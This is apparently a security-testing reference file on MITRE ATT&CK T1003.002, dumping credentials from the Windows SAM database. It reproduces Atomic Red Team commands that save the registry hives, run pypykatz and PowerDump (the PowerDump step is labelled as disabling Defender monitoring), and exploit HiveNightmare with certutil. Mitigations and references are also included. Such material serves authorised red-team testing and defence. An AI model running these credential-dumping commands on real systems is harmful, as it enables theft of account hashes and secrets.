---
name: "T1003.002_security-account-manager"
description: "Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is..."
category: "authentication"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1003.002
  - credential-access
  - windows
  - sub-technique
technique_id: "T1003.002"
tactic: "credential-access"
all_tactics:
  - credential-access
platforms:
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1003/002"
tech_stack:
  - windows
cwe_ids:
  - CWE-522
chains_with:
  - T1003
  - T1003.001
  - T1003.003
  - T1003.004
  - T1003.005
  - T1003.006
  - T1003.007
  - T1003.008
prerequisites:
  - T1003
severity_boost:
  T1003: "Chain with T1003 for deeper attack path"
  T1003.001: "Chain with T1003.001 for deeper attack path"
  T1003.003: "Chain with T1003.003 for deeper attack path"
---

# T1003.002 Security Account Manager

> **Sub-technique of:** T1003

## High-Level Description

Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe
* gsecdump
* Mimikatz
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes.

Notes: 

* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.

## Kill Chain Phase

- Credential Access (TA0006)

**Platforms:** Windows

## What to Check

- [ ] Identify if Security Account Manager technique is applicable to target environment
- [ ] Check Windows systems for indicators of Security Account Manager
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Registry dump of SAM, creds, and secrets

Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7

Upon successful execution of this test, you will find three files named, sam, system and security in the %temp% directory.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
```

### Atomic Test 2: Registry parse with pypykatz

Parses registry hives to obtain stored credentials.

Will create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
"#{venv_path}\Scripts\pypykatz" live lsa
```

**Dependencies:**
- Computer must have python 3 installed
- Computer must have venv configured at #{venv_path}
- pypykatz must be installed

### Atomic Test 3: esentutl.exe SAM copy

Copy the SAM hive using the esentutl.exe utility
This can also be used to copy other files and hives like SYSTEM, NTUSER.dat etc.

**Supported Platforms:** windows
**Elevation Required:** Yes

```cmd
esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
```

### Atomic Test 4: PowerDump Hashes and Usernames from Registry

Executes a hashdump by reading the hashes from the registry.

**Supported Platforms:** windows
**Elevation Required:** Yes

```powershell
Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
Import-Module "PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1"
Invoke-PowerDump
```

**Dependencies:**
- PowerDump script must exist on disk at specified location

### Atomic Test 5: dump volume shadow copy hives with certutil

Dump hives from volume shadow copies with the certutil utility, exploiting a vulnerability known as "HiveNightmare" or "SeriousSAM".
This can be done with a non-admin user account. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)

**Supported Platforms:** windows

```cmd
for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex "\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Security Account Manager by examining the target platforms (Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1003.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1027 Password Policies
Ensure that local administrator accounts have complex, unique passwords across all systems on the network.

### M1026 Privileged Account Management
Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.

### M1028 Operating System Configuration
Consider disabling or restricting NTLM.

### M1017 User Training
Limit credential overlap across accounts and systems by training users and administrators not to use the same password for multiple accounts.


## Detection

### Credential Dumping from SAM via Registry Dump and Local File Access


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Security Account Manager technique applicable | High | Credential Access |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-522 | Insufficiently Protected Credentials |


## References

- [GitHub Creddump7](https://github.com/Neohapsis/creddump7)
- [Atomic Red Team - T1003.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1003.002)
- [MITRE ATT&CK - T1003.002](https://attack.mitre.org/techniques/T1003/002)
